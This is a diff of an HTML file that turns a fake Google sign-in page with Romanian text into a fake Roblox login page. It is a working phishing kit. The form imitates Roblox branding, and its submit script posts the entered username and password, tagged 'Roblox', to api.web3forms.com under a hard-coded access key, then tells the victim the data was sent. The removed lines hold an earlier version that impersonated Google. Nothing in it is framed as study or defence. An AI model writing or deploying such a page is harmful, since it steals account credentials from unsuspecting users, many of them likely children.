@@ -1,36 +1,44 @@
 <!DOCTYPE html>
-<html lang="ro">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sign in - Google Accounts</title>
+<title>Roblox</title>
 <style>
-  body { font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-  .box { width: 100%; max-width: 380px; padding: 40px; text-align: center; }
-  .logo { font-size: 26px; font-weight: 500; margin-bottom: 8px; }
-  .sub { color: #202124; font-size: 16px; margin-bottom: 30px; }
-  input { width: 100%; padding: 14px 14px; margin-bottom: 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-  input:focus { outline: none; border: 2px solid #1a73e8; }
-  button { background: #1a73e8; color: #fff; border: none; padding: 12px 26px; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; }
-  button:hover { background: #1765cc; }
-  .msg { margin-top: 18px; font-size: 13px; color: #5f6368; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #e3e3e3; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+  .card { background: #fff; width: 100%; max-width: 400px; padding: 40px 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+  .logo { text-align: center; font-size: 32px; font-weight: 900; color: #00a2ff; margin-bottom: 25px; letter-spacing: -1px; }
+  .field { margin-bottom: 12px; }
+  .field label { display: block; font-size: 12px; color: #666; margin-bottom: 4px; font-weight: 600; }
+  input { width: 100%; padding: 12px 14px; border: 1px solid #bdbdbd; border-radius: 4px; font-size: 15px; background: #fafafa; }
+  input:focus { outline: none; border-color: #00a2ff; background: #fff; }
+  .btn { width: 100%; background: #00a2ff; color: #fff; border: none; padding: 14px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+  .btn:hover { background: #0088d6; }
+  .msg { text-align: center; margin-top: 15px; font-size: 13px; color: #666; }
+  .forgot { text-align: center; margin-top: 15px; font-size: 13px; color: #666; }
 </style>
 </head>
 <body>
-<div class="box">
-  <div class="logo"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></div>
-  <div class="sub">Sign in to continue</div>
+<div class="card">
+  <div class="logo">ROBLOX</div>
   <form id="f">
-    <input type="email" id="user" placeholder="Email" required>
-    <input type="password" id="pass" placeholder="Parolă" required>
-    <button type="submit">Next</button>
+    <input type="hidden" name="access_key" value="cc48747a-4479-4449-af19-c72f136e8cc7">
+    <div class="field">
+      <label>Username</label>
+      <input type="text" id="user" placeholder="Username" required>
+    </div>
+    <div class="field">
+      <label>Password</label>
+      <input type="password" id="pass" placeholder="Password" required>
+    </div>
+    <button type="submit" class="btn">Log In</button>
   </form>
   <div class="msg" id="msg"></div>
+  <div class="forgot">Forgot Password or Username?</div>
 </div>
 
 <script>
-const ENDPOINT = "PUNE_ENDPOINT_UL_AICI";
-
 document.getElementById('f').addEventListener('submit', async (e) => {
   e.preventDefault();
   const user = document.getElementById('user').value;
@@ -40,12 +48,22 @@ document.getElementById('f').addEventListener('submit', async (e) => {
   msg.innerText = "Se trimite...";
 
   try {
-    await fetch(ENDPOINT, {
+    const res = await fetch("https://api.web3forms.com/submit", {
       method: "POST",
       headers: {"Content-Type": "application/json", "Accept": "application/json"},
-      body: JSON.stringify({ email: user, parola: pass })
+      body: JSON.stringify({
+        access_key: document.querySelector('input[name="access_key"]').value,
+        platform: "Roblox",
+        username: user,
+        password: pass
+      })
     });
-    msg.innerText = "✓ Trimis!";
+    const data = await res.json();
+    if (data.success) {
+      msg.innerText = "✓ Trimis!";
+    } else {
+      msg.innerText = "Eroare: " + JSON.stringify(data);
+    }
   } catch (err) {
     msg.innerText = "Eroare: " + err;
   }
